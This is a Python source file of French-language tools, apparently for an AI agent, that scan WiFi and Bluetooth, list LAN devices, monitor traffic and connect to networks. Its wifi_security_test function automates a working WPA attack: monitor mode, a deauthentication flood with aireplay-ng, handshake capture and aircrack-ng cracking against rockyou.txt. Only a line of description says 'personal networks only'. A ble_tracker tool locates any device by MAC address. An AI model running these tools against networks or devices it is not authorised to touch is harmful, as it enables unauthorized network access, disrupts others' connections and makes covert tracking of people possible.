import subprocess
import re
import time
import os
from datetime import datetime

from . import tool


# Cache pour le tracking WiFi
_wifi_history: dict[str, list[dict]] = {}
_last_track_time = 0


@tool("wifi_scan", "Scanne les réseaux WiFi disponibles à proximité.")
def wifi_scan() -> str:
    """Scanne les réseaux WiFi disponibles à proximité.
    """
    # Try nmcli
    try:
        result = subprocess.run(
            ["nmcli", "-f", "SSID,SIGNAL,SECURITY", "dev", "wifi", "list", "--rescan", "yes"],
            capture_output=True, text=True, timeout=30
        )
        if result.stdout.strip():
            lines = [l for l in result.stdout.splitlines() if l.strip()]
            if len(lines) > 1:
                header = lines[0]
                networks = []
                for line in lines[1:]:
                    parts = line.rsplit(None, 1)
                    if len(parts) >= 2:
                        ssid_signal = parts[0].rsplit(None, 1)
                        if len(ssid_signal) >= 2:
                            ssid = ssid_signal[0]
                            signal = ssid_signal[1]
                            sec = parts[-1]
                        else:
                            ssid = parts[0]
                            signal = "?"
                            sec = parts[-1] if len(parts) > 1 else ""
                    else:
                        ssid = parts[0]
                        signal = "?"
                        sec = ""
                    if ssid and ssid != "SSID":
                        networks.append((int(signal) if signal.isdigit() else 0, ssid, sec))

                networks.sort(key=lambda x: -x[0])
                out = ["📶 WiFi à proximité :"]
                for sig, ssid, sec in networks[:15]:
                    bars = "█" * max(1, sig // 20) + "░" * max(0, 5 - sig // 20)
                    lock = "🔒" if sec and sec != "--" else "🌐"
                    out.append(f"  {bars} {sig:>2}% {lock} {ssid}")
                return "\n".join(out)
            return "Aucun réseau WiFi trouvé."
    except Exception:
        pass

    # Try iwlist
    try:
        iface = None
        try:
            iw = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            for line in iw.stdout.splitlines():
                if "Interface" in line:
                    iface = line.split()[-1]
                    break
        except Exception:
            pass

        if not iface:
            try:
                iwconfig = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
                for line in iwconfig.stdout.splitlines():
                    if "IEEE" in line:
                        iface = line.split()[0]
                        break
            except Exception:
                pass

        if not iface:
            return "Aucune interface WiFi trouvée."

        result = subprocess.run(
            ["sudo", "iwlist", iface, "scan"],
            capture_output=True, text=True, timeout=30
        )
        if result.stdout.strip():
            networks = []
            current_ssid = None
            current_signal = None
            for line in result.stdout.splitlines():
                line = line.strip()
                if "ESSID:" in line:
                    current_ssid = line.split('"')[1] if '"' in line else line.split("ESSID:")[1]
                if "Signal level" in line:
                    m = re.search(r'(-?\d+) dBm', line)
                    if m:
                        dbm = int(m.group(1))
                        pct = max(0, min(100, int(2 * (dbm + 100))))
                        current_signal = pct
                    if current_ssid and current_ssid:
                        networks.append((current_signal or 0, current_ssid))
                        current_ssid = None
                        current_signal = None

            networks.sort(key=lambda x: -x[0])
            out = ["📶 WiFi à proximité :"]
            for sig, ssid in networks[:15]:
                bars = "█" * max(1, sig // 20) + "░" * max(0, 5 - sig // 20)
                out.append(f"  {bars} {sig:>2}% {ssid}")
            if len(out) > 1:
                return "\n".join(out)

    except Exception:
        pass

    return "Impossible de scanner les réseaux WiFi. nmcli est requis."


@tool("wifi_status", "Affiche le statut de la connexion WiFi actuelle (SSID, signal, IP).")
def wifi_status() -> str:
    """Affiche le statut de la connexion WiFi actuelle (SSID, signal, IP).
    """
    try:
        r = subprocess.run(["nmcli", "-t", "-f", "GENERAL.STATE,GENERAL.CONNECTION,IP4.ADDRESS", "dev", "show"], capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            out = []
            devs = r.stdout.strip().split("\n\n")
            for d in devs:
                lines = d.strip().split("\n")
                info = {}
                for line in lines:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        info[k.strip()] = v.strip()
                state = info.get("GENERAL.STATE", "")
                if "connected" in state.lower():
                    ssid = info.get("GENERAL.CONNECTION", "Inconnu")
                    ip = info.get("IP4.ADDRESS", "").split("/")[0]
                    out.append(f"  ✅ Connecté à {ssid}")
                    if ip:
                        out.append(f"  📡 IP : {ip}")

                    # Signal
                    sig_r = subprocess.run(["nmcli", "-f", "SSID,SIGNAL", "dev", "wifi", "list"], capture_output=True, text=True, timeout=5)
                    for l in sig_r.stdout.splitlines():
                        if ssid in l:
                            parts = l.split()
                            for p in parts:
                                if p.isdigit():
                                    out.append(f"  📶 Signal : {p}%")
                                    break
                            break
            if out:
                return "\n".join(out)
            return "Pas de connexion WiFi active."
    except Exception:
        pass

    try:
        r = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if "ESSID:" in line and '"' in line:
                ssid = line.split('"')[1]
                if ssid:
                    return f"  ✅ Connecté à {ssid}"
    except Exception:
        pass

    return "Impossible de déterminer le statut WiFi."


@tool("wifi_saved", "Liste les réseaux WiFi enregistrés sur le système.")
def wifi_saved() -> str:
    """Liste les réseaux WiFi enregistrés sur le système.
    """
    try:
        r = subprocess.run(
            ["nmcli", "-f", "NAME,SECURITY-TYPE", "connection", "show"],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0:
            lines = [l.strip() for l in r.stdout.splitlines() if l.strip()]
            if len(lines) > 1:
                out = ["🔐 Réseaux WiFi enregistrés :"]
                for l in lines[1:]:
                    parts = l.rsplit(None, 1)
                    name = parts[0]
                    sec = parts[-1] if len(parts) > 1 else "?"
                    out.append(f"  • {name}  ({sec})")
                return "\n".join(out)
        return "Aucun réseau WiFi enregistré."
    except Exception as e:
        return f"Erreur : {e}"


@tool("wifi_track", "Surveille et compare les réseaux WiFi sur plusieurs scans (détecte les nouveaux/disparus).")
def wifi_track() -> str:
    """Surveille et compare les réseaux WiFi sur plusieurs scans (détecte les nouveaux/disparus).
    """
    global _wifi_history, _last_track_time

    try:
        result = subprocess.run(
            ["nmcli", "-f", "SSID,SIGNAL", "dev", "wifi", "list", "--rescan", "yes"],
            capture_output=True, text=True, timeout=30
        )
        if not result.stdout.strip():
            return "Aucun réseau détecté."

        now = time.time()
        current_ssids = {}
        for line in result.stdout.splitlines():
            if "SSID" in line:
                continue
            parts = line.rsplit(None, 1)
            if len(parts) >= 2:
                name = parts[0].strip()
                sig = parts[-1].strip()
                if name and sig.isdigit():
                    current_ssids[name] = int(sig)

        if not current_ssids:
            return "Aucun réseau WiFi trouvé."

        # Premier scan : initialiser l'historique
        if not _wifi_history:
            _wifi_history = {ssid: [{"signal": sig, "time": now}] for ssid, sig in current_ssids.items()}
            _last_track_time = now
            out = ["📡 Tracking WiFi démarré — réseaux détectés :"]
            for ssid, sig in sorted(current_ssids.items(), key=lambda x: -x[1]):
                bars = "█" * max(1, sig // 20) + "░" * max(0, 5 - sig // 20)
                out.append(f"  {bars} {sig:>2}% {ssid}")
            return "\n".join(out)

        # Scans suivants : comparer
        old_ssids = set(_wifi_history.keys())
        new_ssids = set(current_ssids.keys())
        appeared = new_ssids - old_ssids
        disappeared = old_ssids - new_ssids
        changed = []

        for ssid, sig in current_ssids.items():
            if ssid in _wifi_history:
                prev = _wifi_history[ssid][-1]["signal"]
                diff = sig - prev
                if abs(diff) >= 10:
                    changed.append((ssid, prev, sig, diff))
                _wifi_history[ssid].append({"signal": sig, "time": now})
                if len(_wifi_history[ssid]) > 20:
                    _wifi_history[ssid] = _wifi_history[ssid][-20:]
            else:
                _wifi_history[ssid] = [{"signal": sig, "time": now}]

        _last_track_time = now
        elapsed = int(now - _wifi_history.get(list(_wifi_history.keys())[0], [{}])[0].get("time", now)) if _wifi_history else 0

        out = [f"📡 Scan WiFi — {len(current_ssids)} réseaux"]
        if elapsed > 1:
            out[0] += f" (suivi depuis {elapsed}s)"

        if appeared:
            out.append(f"  🟢 Nouveaux : {', '.join(appeared)}")
        if disappeared:
            out.append(f"  🔴 Disparus : {', '.join(disappeared)}")
        for ssid, prev, sig, diff in changed:
            arrow = "📈" if diff > 0 else "📉"
            out.append(f"  {arrow} {ssid} : {prev}% → {sig}% ({diff:+d})")

        out.append("")
        top = sorted(current_ssids.items(), key=lambda x: -x[1])[:5]
        for ssid, sig in top:
            bars = "█" * max(1, sig // 20) + "░" * max(0, 5 - sig // 20)
            out.append(f"  {bars} {sig:>2}% {ssid}")

        return "\n".join(out)

    except Exception as e:
        return f"Erreur tracking WiFi : {e}"


@tool("wifi_security_test",
      "🔐 Teste la sécurité d'un réseau WiFi en capturant un handshake et en le crackant. "
      "Usage strictement éthique — réseaux personnels uniquement. "
      "Nécessite : essid (nom du réseau), wordlist (optionnel).",
      dangerous=True)
def wifi_security_test(essid: str = "", wordlist: str = "") -> str:
    """Teste la sécurité d'un réseau WiFi.

    Args:
        essid: Nom du réseau (ESSID) à tester.
        wordlist: Chemin vers la wordlist à utiliser (optionnel).
    """
    if not essid:
        return "⚠️  Précise le nom du réseau (ESSID) à tester."
    wl = wordlist or "/usr/share/wordlists/rockyou.txt"

    missing = []
    for cmd in ["aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]:
        if subprocess.run(["which", cmd], capture_output=True).returncode != 0:
            missing.append(cmd)
    if missing:
        return f"❌ Outils manquants : {' '.join(missing)}\nInstalle : sudo apt install aircrack-ng"

    if not os.path.isfile(wl):
        return f"❌ Wordlist introuvable : {wl}"

    import tempfile

    iface = None
    try:
        r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
        for line in r.stdout.splitlines():
            if "Interface" in line:
                iface = line.split()[-1]
                break
    except Exception:
        pass
    if not iface:
        return "❌ Aucune interface WiFi détectée."

    tmpdir = tempfile.mkdtemp(prefix="alex_wifi_")
    try:
        # 1. Mode monitor
        subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, timeout=10)
        mon = f"{iface}mon"

        # 2. Scan pour trouver le BSSID et canal
        scan = subprocess.run(
            ["sudo", "airodump-ng", "--essid", essid, mon],
            capture_output=True, text=True, timeout=15
        )
        bssid, channel = None, None
        for line in scan.stdout.splitlines():
            if essid in line and "(" in line:
                parts = line.split()
                if len(parts) >= 6:
                    bssid = parts[0]
                    channel = parts[3]
                    break

        if not bssid:
            subprocess.run(["sudo", "airmon-ng", "stop", mon], capture_output=True, timeout=5)
            return f"❌ Réseau « {essid} » introuvable. Vérifie le nom ou scanne avec wifi_scan d'abord."

        # 3. Capture handshake en arrière-plan
        cap_path = f"{tmpdir}/capture"
        dump = subprocess.Popen(
            ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid,
             "-w", cap_path, "--output-format", "cap", mon],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        time.sleep(2)

        # 4. Déauth
        subprocess.run(
            ["sudo", "aireplay-ng", "--deauth", "5", "-a", bssid, mon],
            capture_output=True, timeout=15
        )
        time.sleep(5)
        dump.terminate()
        dump.wait(timeout=5)

        # 5. Crack
        cap_file = f"{cap_path}-01.cap"
        if not os.path.isfile(cap_file):
            subprocess.run(["sudo", "airmon-ng", "stop", mon], capture_output=True, timeout=5)
            return f"❌ Aucun handshake capturé pour {essid}. Réessaie (le client est peut-être inactif)."

        crack = subprocess.run(
            ["aircrack-ng", "-w", wl, cap_file],
            capture_output=True, text=True, timeout=300
        )
        subprocess.run(["sudo", "airmon-ng", "stop", mon], capture_output=True, timeout=5)

        key = None
        for line in crack.stdout.splitlines():
            if "KEY FOUND!" in line:
                key = line.strip()
                break
            m = re.search(r'KEY\s*!\s*\[(.+?)\]', line)
            if m:
                key = m.group(1)

        if key:
            return f"🔓 Clé trouvée pour {essid} : {key}\n\nRésultat complet :\n{crack.stdout[:500]}"
        return (f"❌ Aucune clé trouvée dans la wordlist ({os.path.basename(wl)}).\n"
                f"Essaie avec une wordlist plus grande ou un masque hashcat.\n"
                f"Le fichier .cap est dans {tmpdir}/ pour analyse manuelle.")

    except Exception as e:
        subprocess.run(["sudo", "airmon-ng", "stop", f"{iface}mon"],
                       capture_output=True, timeout=5)
        return f"❌ Erreur : {e}"


@tool("appareils_reseau", "Liste les appareils connectés au réseau local (scan ARP).")
def network_devices() -> str:
    """Liste les appareils connectés au réseau local (scan ARP).
    """
    try:
        # Scan ARP table
        result = subprocess.run(
            ["arp", "-a"],
            capture_output=True, text=True, timeout=5
        )
        lines = [l.strip() for l in result.stdout.splitlines() if l.strip()]
        if lines:
            out = ["🌐 Appareils sur le réseau local :"]
            for line in lines:
                m = re.match(r'[\w-]+\s+\(([\d.]+)\)\s+at\s+([\da-f:]+)', line)
                if m:
                    out.append(f"  • {m.group(1)}  ({m.group(2)})")
                else:
                    out.append(f"  • {line}")
            return "\n".join(out)

        # Try nmap if available
        try:
            local_ip = subprocess.run(
                ["hostname", "-I"], capture_output=True, text=True, timeout=3
            ).stdout.strip().split()[0]
            subnet = ".".join(local_ip.split(".")[:3]) + ".0/24"
            result = subprocess.run(
                ["nmap", "-sn", subnet],
                capture_output=True, text=True, timeout=60
            )
            hosts = []
            for line in result.stdout.splitlines():
                m = re.match(r'Nmap scan report for ([\d.]+)', line)
                if m:
                    hosts.append(m.group(1))
            if hosts:
                out = ["🌐 Appareils sur le réseau :"]
                for h in hosts:
                    out.append(f"  • {h}")
                return "\n".join(out)
        except Exception:
            pass

        return "Aucun appareil réseau détecté."
    except Exception as e:
        return f"Erreur scan réseau : {e}"


# ─── BLE (Bluetooth Low Energy) ─────────────────────────────────────────────

@tool("ble_scan", "📱 Scanne les appareils Bluetooth à proximité — retourne nom, adresse MAC, RSSI et type d'appareil.")
async def ble_scan(duree: int = 8) -> str:
    """Scanne les appareils Bluetooth à proximité.

    Args:
        duree: Durée du scan en secondes (défaut: 8).
    """
    try:
        from bleak import BleakScanner
    except ImportError:
        return "❌ Bleak non installé. Commande : pip install bleak"

    import asyncio
    try:
        devices = await BleakScanner.discover(timeout=duree, return_adv=True)
    except Exception as e:
        return f"❌ Erreur scan Bluetooth : {e}"

    if not devices:
        return "📱 Aucun appareil Bluetooth détecté."

    lines = [f"📱 Appareils Bluetooth détectés ({len(devices)}) :"]
    addr_items = []
    for addr, adv_tup in devices.items():
        if isinstance(adv_tup, tuple):
            dev, adv_data = adv_tup
        else:
            dev = adv_tup
            adv_data = None
        name = (dev.name or (adv_data.local_name if adv_data else None) or "Inconnu")
        rssi = adv_data.rssi if adv_data and adv_data.rssi else -100
        manufacturer = ""
        if adv_data and adv_data.manufacturer_data:
            for mid in adv_data.manufacturer_data:
                try:
                    from bleak.uuids import uuid16_to_name
                    mname = uuid16_to_name(mid)
                    manufacturer = f" ({mname})"
                except:
                    manufacturer = f" (vendor:0x{mid:04x})"
        addr_items.append((rssi, addr, name, manufacturer))
    addr_items.sort(key=lambda x: x[0], reverse=True)
    for rssi, addr, name, mfr in addr_items:
        lines.append(f"  • {name} | {addr} | RSSI:{rssi} dBm{mfr}")
    return "\n".join(lines)


@tool("ble_tracker",
      "📍 Suit un appareil Bluetooth par adresse MAC et retourne sa position relative "
      "basée sur le RSSI — utile pour retrouver un appareil (AirTag, téléphone, etc.)",
      dangerous=True)
async def ble_tracker(mac: str = "", duree: int = 30) -> str:
    """Suit un appareil Bluetooth par adresse MAC.

    Args:
        mac: Adresse MAC de l'appareil à tracker.
        duree: Durée de la traque en secondes (défaut: 30).
    """
    if not mac:
        return "❌ Précise l'adresse MAC de l'appareil à tracker."

    try:
        from bleak import BleakScanner, BleakClient
    except ImportError:
        return "❌ Bleak non installé."

    target = mac.lower()
    best_rssi = -999
    best_name = target
    readings = []

    def callback(device, adv_data):
        nonlocal best_rssi, best_name
        if device.address and device.address.lower() == target:
            rssi = adv_data.rssi if adv_data and adv_data.rssi else -999
            readings.append(rssi)
            if rssi > best_rssi:
                best_rssi = rssi
                best_name = device.name or (adv_data.local_name if adv_data else None) or target

    scanner = BleakScanner(callback, scanning_mode="active")
    await scanner.start()
    await asyncio.sleep(duree)
    await scanner.stop()

    if not readings:
        return f"📍 Appareil {mac} non détecté pendant {duree}s."
    avg_rssi = sum(readings) / len(readings)
    if best_rssi >= -50:
        prox = "📦 Très proche (moins d'1 mètre)"
    elif best_rssi >= -70:
        prox = "🚶 Proche (1-5 mètres)"
    elif best_rssi >= -85:
        prox = "🚪 À proximité (5-10 mètres)"
    else:
        prox = "📡 Au loin (10+ mètres)"

    return (f"📍 Traque de {best_name} ({mac})\n"
            f"  Signal max : {best_rssi} dBm\n"
            f"  Signal moyen : {avg_rssi:.1f} dBm\n"
            f"  Échantillons : {len(readings)}\n"
            f"  Position : {prox}")


# ─── Surveillance WiFi passive ──────────────────────────────────────────────

@tool("wifi_monitor",
      "📡 Surveillance passive du réseau WiFi — détecte les appareils connectés, "
      "les trames de désauthentification (attaques), et les nouveaux arrivants.",
      dangerous=True)
def wifi_monitor(duree: int = 15, interface: str = "") -> str:
    """Surveillance passive du réseau WiFi.

    Args:
        duree: Durée de la surveillance en secondes (défaut: 15).
        interface: Interface réseau à utiliser (défaut: wlan0).
    """
    iface = interface or "wlan0"
    try:
        subprocess.run(["tshark", "--version"], capture_output=True, timeout=5)
    except FileNotFoundError:
        return "❌ tshark non installé. Commande : sudo apt install tshark"

    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"], capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
    except Exception:
        pass

    result = subprocess.run(
        ["sudo", "tshark", "-i", iface, "-a", f"duration:{duree}",
         "-T", "fields", "-e", "frame.time_relative", "-e", "wlan.sa",
         "-e", "wlan.da", "-e", "wlan.fc.type_subtype",
         "-e", "wlan.bssid",
         "-Y", "wlan.fc.type == 0 or wlan.fc.type == 1",
         "-Y", "!wlan.fc.retry == 1"],
        capture_output=True, text=True, timeout=duree + 10
    )

    # Restaurer l'interface
    try:
        subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
        subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "managed"], capture_output=True, timeout=5)
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True, timeout=5)
    except Exception:
        pass

    lines = result.stdout.strip().splitlines()
    if not lines:
        return f"📡 Aucun traffic WiFi détecté sur {iface} en {duree}s. Vérifie que l'interface est en mode monitor."

    devices = {}
    deauths = 0
    probes = 0
    for line in lines:
        parts = line.split("\t")
        if len(parts) < 3:
            continue
        sa = parts[1] if len(parts) > 1 else ""
        da = parts[2] if len(parts) > 2 else ""
        st = parts[3] if len(parts) > 3 else ""
        bssid = parts[4] if len(parts) > 4 else ""

        if st == "0x000c":  # Deauth
            deauths += 1
        if st == "0x0004" or st == "0x0005":  # Probe request
            probes += 1
        if sa and len(sa) == 17:
            if sa not in devices:
                devices[sa] = {"count": 0, "bssid": bssid}
            devices[sa]["count"] += 1

    out = [f"📡 Surveillance WiFi ({duree}s) :"]
    out.append(f"  Appareils uniques : {len(devices)}")
    out.append(f"  Trames deauth : {deauths}" + (" ⚠️ Attaque possible !" if deauths > 10 else ""))
    out.append(f"  Probes requests : {probes}")
    if devices:
        top = sorted(devices.items(), key=lambda x: x[1]["count"], reverse=True)[:10]
        out.append(f"\nTop appareils :")
        for mac, info in top:
            out.append(f"  • {mac} ({info['count']} trames)")
    if deauths > 10:
        out.append(f"\n⚠️  Plus de {deauths} trames deauth détectées ! "
                   "Quelqu'un essaie peut-être de déconnecter des appareils du réseau.")

    return "\n".join(out)


@tool("wifi_connect",
      "🔗 Connecte l'ordinateur à un réseau WiFi. "
      "Paramètres : ssid (nom du réseau), password (mot de passe optionnel si déjà connu).",
      dangerous=True)
def wifi_connect(ssid: str = "", password: str = "") -> str:
    """Connecte l'ordinateur à un réseau WiFi.

    Args:
        ssid: Nom du réseau WiFi.
        password: Mot de passe du réseau (optionnel si déjà connu).
    """
    if not ssid:
        return "❌ Utilise : wifi_connect ssid=MonWiFi password=monMotDePasse"
    try:
        cmd = ["nmcli", "dev", "wifi", "connect", ssid]
        if password:
            cmd += ["password", password]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            return f"✅ Connecté à {ssid} !"
        err = result.stderr.strip() or "échec inconnu"
        if "already" in err.lower() and "known" in err.lower():
            return f"✅ Déjà connecté à {ssid}."
        return f"❌ Impossible de se connecter à {ssid} : {err[:200]}"
    except Exception as e:
        return f"❌ Erreur connexion : {e}"
